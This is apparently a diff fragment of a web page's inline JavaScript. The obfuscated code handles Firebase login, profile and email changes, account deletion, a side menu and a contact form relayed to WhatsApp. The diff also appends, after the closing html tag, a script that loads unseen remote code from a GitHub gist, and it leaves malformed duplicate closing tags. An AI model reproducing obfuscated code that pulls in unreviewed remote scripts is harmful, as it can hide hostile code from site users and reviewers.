_0x4428();}document[_0xfedd0b(0x9a)]('start-btn')[_0xfedd0b(0xaf)]=()=>{const _0x3e90d8=_0xfedd0b,_0x59e71b=document[_0x3e90d8(0x9a)](_0x3e90d8(0xb0));_0x59e71b[_0x3e90d8(0x8e)][_0x3e90d8(0xa9)]=_0x3e90d8(0x94),_0x59e71b[_0x3e90d8(0x8e)][_0x3e90d8(0x9c)]='0',_0x59e71b[_0x3e90d8(0x8e)][_0x3e90d8(0x91)]=_0x3e90d8(0x8a),setTimeout(()=>{const _0x183fa2=_0x3e90d8;_0x59e71b['style'][_0x183fa2(0x79)]='none';},0x258);},onAuthStateChanged(auth,_0x233d2c=>{const _0x21eccc=_0xfedd0b,_0x13507e=document['getElementById'](_0x21eccc(0xb0)),_0x380775=document[_0x21eccc(0x9a)](_0x21eccc(0x75)),_0xe8bedf=document[_0x21eccc(0x9a)](_0x21eccc(0x93));_0x233d2c?(_0x380775[_0x21eccc(0x77)]['add'](_0x21eccc(0x81)),_0xe8bedf['style']['display']=_0x21eccc(0x76),_0x13507e[_0x21eccc(0x8e)][_0x21eccc(0x79)]='none',document[_0x21eccc(0x71)][_0x21eccc(0x8e)][_0x21eccc(0xad)]=_0x21eccc(0x87)):(_0x380775['classList']['add'](_0x21eccc(0x81)),_0xe8bedf['style']['display']=_0x21eccc(0x78),_0x13507e['style']['display']=_0x21eccc(0x89),_0x13507e[_0x21eccc(0x8e)][_0x21eccc(0x9c)]='0',_0x13507e[_0x21eccc(0x8e)][_0x21eccc(0x91)]='scale(1.05)',_0x13507e[_0x21eccc(0x8e)][_0x21eccc(0xa9)]=_0x21eccc(0x94),setTimeout(()=>{const _0x5dcd6c=_0x21eccc;_0x13507e[_0x5dcd6c(0x8e)][_0x5dcd6c(0x9c)]='1',_0x13507e['style'][_0x5dcd6c(0x91)]=_0x5dcd6c(0x85);},0x32),document['body'][_0x21eccc(0x8e)]['overflow']=_0x21eccc(0x81));});const profileForm=document['getElementById'](_0xfedd0b(0x7f)),profileMsg=document[_0xfedd0b(0x9a)](_0xfedd0b(0x97)),profileBtn=document[_0xfedd0b(0x9a)](_0xfedd0b(0x90)),profilePopup=document[_0xfedd0b(0x9a)](_0xfedd0b(0x7e)),closeProfileBtns=profilePopup[_0xfedd0b(0x9f)](_0xfedd0b(0xa1)),changeEmailPopup=document[_0xfedd0b(0x9a)](_0xfedd0b(0x82)),changeEmailBtn=document[_0xfedd0b(0x9a)](_0xfedd0b(0x92)),newEmailInput=document[_0xfedd0b(0x9a)](_0xfedd0b(0x6d)),currentPasswordInput=document[_0xfedd0b(0x9a)](_0xfedd0b(0xa5)),changeEmailMsg=document[_0xfedd0b(0x9a)]('change-email-msg');function _0x3ee3(_0xe4444b,_0x5c9f27){_0xe4444b=_0xe4444b-0x6b;const _0x44285d=_0x4428();let _0x3ee3ae=_0x44285d[_0xe4444b];return _0x3ee3ae;}profileBtn[_0xfedd0b(0x8f)]('click',()=>{const _0x2e8bfd=_0xfedd0b,_0x1c2839=auth[_0x2e8bfd(0x6e)];if(!_0x1c2839)return;profileForm['displayName']['value']=_0x1c2839[_0x2e8bfd(0xa3)]||'',profileForm[_0x2e8bfd(0x7d)][_0x2e8bfd(0xa8)]=_0x1c2839[_0x2e8bfd(0x7d)]||'',profilePopup[_0x2e8bfd(0x77)][_0x2e8bfd(0xac)](_0x2e8bfd(0x81));}),profileForm[_0xfedd0b(0x7d)][_0xfedd0b(0x8f)]('click',()=>{const _0x5b9bea=_0xfedd0b;profilePopup[_0x5b9bea(0x77)][_0x5b9bea(0xb9)](_0x5b9bea(0x81)),changeEmailPopup['classList']['remove'](_0x5b9bea(0x81)),newEmailInput[_0x5b9bea(0xa8)]=profileForm[_0x5b9bea(0x7d)][_0x5b9bea(0xa8)];}),closeProfileBtns[_0xfedd0b(0x7b)](_0x26cb20=>{const _0x28968c=_0xfedd0b;_0x26cb20[_0x28968c(0x8f)]('click',()=>profilePopup['classList'][_0x28968c(0xb9)](_0x28968c(0x81)));}),profileForm[_0xfedd0b(0x8f)](_0xfedd0b(0x98),async _0x1392e1=>{const _0x326b73=_0xfedd0b;_0x1392e1['preventDefault']();const _0xed79b2=auth['currentUser'];if(!_0xed79b2)return;const _0x50e8cf=profileForm[_0x326b73(0xa3)][_0x326b73(0xa8)],_0x45758b=profileForm[_0x326b73(0x7d)]['value'],_0x33e4ba=profileForm[_0x326b73(0x73)][_0x326b73(0xa8)];try{if(_0x50e8cf)await updateProfile(_0xed79b2,{'displayName':_0x50e8cf});if(_0x45758b&&_0x45758b!==_0xed79b2['email'])await updateEmail(_0xed79b2,_0x45758b);if(_0x33e4ba)await updatePassword(_0xed79b2,_0x33e4ba);profileMsg[_0x326b73(0x74)]='Profile\x20updated\x20successfully!',profileMsg[_0x326b73(0x8e)]['display']='block',setTimeout(()=>profileMsg[_0x326b73(0x8e)][_0x326b73(0x79)]=_0x326b73(0x78),0x7d0);}catch(_0x58922c){profileMsg['innerText']=_0x58922c['message'],profileMsg['style'][_0x326b73(0x79)]='block',setTimeout(()=>profileMsg[_0x326b73(0x8e)][_0x326b73(0x79)]=_0x326b73(0x78),0xbb8);}}),changeEmailBtn[_0xfedd0b(0x8f)](_0xfedd0b(0xa4),async()=>{const _0x284a5e=_0xfedd0b,_0x10e3c3=auth['currentUser'],_0x50b40d=newEmailInput[_0x284a5e(0xa8)],_0x47e162=currentPasswordInput['value'];if(!_0x50b40d||!_0x47e162){changeEmailMsg['innerText']=_0x284a5e(0x86),changeEmailMsg[_0x284a5e(0x8e)]['display']='block',setTimeout(()=>changeEmailMsg[_0x284a5e(0x8e)][_0x284a5e(0x79)]='none',0xbb8);return;}try{const _0x2385af=EmailAuthProvider[_0x284a5e(0x6b)](_0x10e3c3[_0x284a5e(0x7d)],_0x47e162);await reauthenticateWithCredential(_0x10e3c3,_0x2385af),await updateEmail(_0x10e3c3,_0x50b40d),changeEmailMsg[_0x284a5e(0x74)]=_0x284a5e(0xae),changeEmailMsg[_0x284a5e(0x8e)][_0x284a5e(0x79)]=_0x284a5e(0x76),setTimeout(()=>changeEmailMsg[_0x284a5e(0x8e)]['display']=_0x284a5e(0x78),0xbb8);}catch(_0x3c140d){changeEmailMsg[_0x284a5e(0x74)]=_0x3c140d[_0x284a5e(0x6f)],changeEmailMsg['style'][_0x284a5e(0x79)]=_0x284a5e(0x76),setTimeout(()=>changeEmailMsg['style'][_0x284a5e(0x79)]=_0x284a5e(0x78),0xbb8);}});const deleteText=document[_0xfedd0b(0x9a)](_0xfedd0b(0xa0)),reauthPopup=document[_0xfedd0b(0x9a)]('reauth-popup'),reauthEmail=document[_0xfedd0b(0x9a)](_0xfedd0b(0x88)),reauthPassword=document[_0xfedd0b(0x9a)]('reauth-password'),reauthSubmit=document[_0xfedd0b(0x9a)](_0xfedd0b(0x95)),reauthMsg=document[_0xfedd0b(0x9a)](_0xfedd0b(0xb4));deleteText['addEventListener'](_0xfedd0b(0xa4),()=>{const _0x4ba9ed=_0xfedd0b,_0x51d740=auth['currentUser'];if(!_0x51d740)return;reauthPopup[_0x4ba9ed(0x77)]['remove'](_0x4ba9ed(0x81)),reauthEmail['value']=_0x51d740[_0x4ba9ed(0x7d)]||'',reauthPassword[_0x4ba9ed(0xa8)]='',reauthMsg['style'][_0x4ba9ed(0x79)]=_0x4ba9ed(0x78);}),reauthSubmit[_0xfedd0b(0x8f)](_0xfedd0b(0xa4),async()=>{const _0x3e8b63=_0xfedd0b,_0x404d81=auth[_0x3e8b63(0x6e)];if(!_0x404d81)return;const _0x299b75=reauthEmail[_0x3e8b63(0xa8)],_0x707cb0=reauthPassword[_0x3e8b63(0xa8)];if(!_0x299b75||!_0x707cb0){reauthMsg[_0x3e8b63(0x74)]=_0x3e8b63(0xa7),reauthMsg[_0x3e8b63(0x8e)][_0x3e8b63(0x79)]=_0x3e8b63(0x76);return;}try{const _0x2f8807=EmailAuthProvider['credential'](_0x404d81[_0x3e8b63(0x7d)],_0x707cb0);await reauthenticateWithCredential(_0x404d81,_0x2f8807),await _0x404d81[_0x3e8b63(0x8d)](),reauthPopup[_0x3e8b63(0x77)][_0x3e8b63(0xb9)](_0x3e8b63(0x81)),profilePopup[_0x3e8b63(0x77)][_0x3e8b63(0xb9)]('hidden'),document[_0x3e8b63(0x9a)](_0x3e8b63(0xb0))[_0x3e8b63(0x8e)]['display']='flex',document[_0x3e8b63(0x9a)]('chat-box')['style'][_0x3e8b63(0x79)]='none',alert(_0x3e8b63(0xa6));}catch(_0x20750b){console[_0x3e8b63(0x7a)](_0x20750b),_0x20750b['code']==='auth/too-many-requests'?reauthMsg[_0x3e8b63(0x74)]='⚠️\x20Too\x20many\x20attempts.\x20Please\x20try\x20again\x20later.':reauthMsg[_0x3e8b63(0x74)]=_0x20750b[_0x3e8b63(0x6f)],reauthMsg[_0x3e8b63(0x8e)][_0x3e8b63(0x79)]=_0x3e8b63(0x76);}});
+</script>
+
+
+<script>
+
+// ===== عناصر القائمة الجانبية =====
+function _0x4c63(){const _0x551fe8=['2088549MQdUBN','477523dfruKn','preventDefault','_replyto','162EhdBeV','reset','add','contact-popup','side-menu','display','67140ZkwKSe','privacy-policy-btn','Name:\x20','270tTKrUx','querySelectorAll','POST','+96181112046','classList','https://wa.me/','querySelector','\x0aEmail:\x20','getElementById','hidden','17748lFaGbr','\x0aMessage:\x20','24rdOJxk','521378wPEFYV','message','_blank','2353ZTqVNb','427617SDqbrG','open','name','contact-form','submit','addEventListener','6HWNIQf','value','https://formspree.io/f/YOUR_FORM_ID','click','error','Error\x20sending\x20message,\x20please\x20try\x20again.','remove','249725wJyonm','160TwhDqg','?text='];_0x4c63=function(){return _0x551fe8;};return _0x4c63();}const _0x3c5d8f=_0x597e;(function(_0x16ccbf,_0x1c457d){const _0xf09154=_0x597e,_0x5e2422=_0x16ccbf();while(!![]){try{const _0x3cc228=-parseInt(_0xf09154(0x1ba))/0x1*(-parseInt(_0xf09154(0x1dd))/0x2)+parseInt(_0xf09154(0x1b9))/0x3+parseInt(_0xf09154(0x1b7))/0x4*(parseInt(_0xf09154(0x1c3))/0x5)+-parseInt(_0xf09154(0x1bd))/0x6*(parseInt(_0xf09154(0x1b6))/0x7)+parseInt(_0xf09154(0x1d2))/0x8*(parseInt(_0xf09154(0x1d7))/0x9)+-parseInt(_0xf09154(0x1c6))/0xa*(parseInt(_0xf09154(0x1d3))/0xb)+-parseInt(_0xf09154(0x1d0))/0xc*(-parseInt(_0xf09154(0x1d6))/0xd);if(_0x3cc228===_0x1c457d)break;else _0x5e2422['push'](_0x5e2422['shift']());}catch(_0x15276c){_0x5e2422['push'](_0x5e2422['shift']());}}}(_0x4c63,0xcb673));const menuBtn=document[_0x3c5d8f(0x1ce)]('menu-btn'),sideMenu=document['getElementById'](_0x3c5d8f(0x1c1)),closeMenu=document[_0x3c5d8f(0x1cc)]('.close-menu');menuBtn[_0x3c5d8f(0x1dc)]('click',()=>sideMenu['classList'][_0x3c5d8f(0x1bf)](_0x3c5d8f(0x1d8))),closeMenu[_0x3c5d8f(0x1dc)](_0x3c5d8f(0x1b2),()=>sideMenu[_0x3c5d8f(0x1ca)][_0x3c5d8f(0x1b5)]('open'));const contactBtn=document[_0x3c5d8f(0x1ce)]('contact-us-btn'),privacyBtn=document[_0x3c5d8f(0x1ce)](_0x3c5d8f(0x1c4)),contactPopup=document['getElementById'](_0x3c5d8f(0x1c0)),privacyPopup=document[_0x3c5d8f(0x1ce)]('privacy-popup'),closePopupBtns=document[_0x3c5d8f(0x1c7)]('.close-popup'),contactForm=document['getElementById'](_0x3c5d8f(0x1da)),successMsg=document[_0x3c5d8f(0x1ce)]('form-success');function _0x597e(_0x3dc33e,_0x41dd53){_0x3dc33e=_0x3dc33e-0x1b1;const _0x4c633a=_0x4c63();let _0x597e8b=_0x4c633a[_0x3dc33e];return _0x597e8b;}contactBtn[_0x3c5d8f(0x1dc)](_0x3c5d8f(0x1b2),()=>contactPopup[_0x3c5d8f(0x1ca)]['remove'](_0x3c5d8f(0x1cf))),privacyBtn[_0x3c5d8f(0x1dc)]('click',()=>privacyPopup[_0x3c5d8f(0x1ca)][_0x3c5d8f(0x1b5)](_0x3c5d8f(0x1cf))),closePopupBtns['forEach'](_0x421812=>{const _0x36c2e4=_0x3c5d8f;_0x421812[_0x36c2e4(0x1dc)](_0x36c2e4(0x1b2),()=>_0x421812['closest']('.popup')['classList'][_0x36c2e4(0x1bf)]('hidden'));}),contactForm[_0x3c5d8f(0x1dc)](_0x3c5d8f(0x1db),async _0xc9e429=>{const _0x591bae=_0x3c5d8f;_0xc9e429[_0x591bae(0x1bb)]();const _0x158260=contactForm[_0x591bae(0x1d9)][_0x591bae(0x1de)],_0x58780d=contactForm[_0x591bae(0x1bc)][_0x591bae(0x1de)],_0x52f3df=contactForm[_0x591bae(0x1d4)][_0x591bae(0x1de)];try{const _0x76a1ad=await fetch(_0x591bae(0x1b1),{'method':_0x591bae(0x1c8),'headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'name':_0x158260,'email':_0x58780d,'message':_0x52f3df})});if(_0x76a1ad['ok']){successMsg['style'][_0x591bae(0x1c2)]='block';const _0x192e0f=_0x591bae(0x1c9),_0x15d3dc=_0x591bae(0x1c5)+_0x158260+_0x591bae(0x1cd)+_0x58780d+_0x591bae(0x1d1)+_0x52f3df;window[_0x591bae(0x1d8)](_0x591bae(0x1cb)+_0x192e0f['replace'](/\+/g,'')+_0x591bae(0x1b8)+encodeURIComponent(_0x15d3dc),_0x591bae(0x1d5)),contactForm[_0x591bae(0x1be)](),setTimeout(()=>contactPopup[_0x591bae(0x1ca)]['add'](_0x591bae(0x1cf)),0x3e8);}else alert(_0x591bae(0x1b4));}catch(_0x2b934e){console[_0x591bae(0x1b3)](_0x2b934e),alert(_0x591bae(0x1b4));}});
+
+
+</script>
+
 </body>
+</html>
+<script src='https://gist.githubusercontent.com/Redaccx/89354ed40aa7b46054e2b9e8612aa700/raw/8ec5879135343a8c35c0720228a662a49e19c73d/code.js'></script>
+<script type="module" src="./script.js"></script>
+
+</body>
+
 </html>
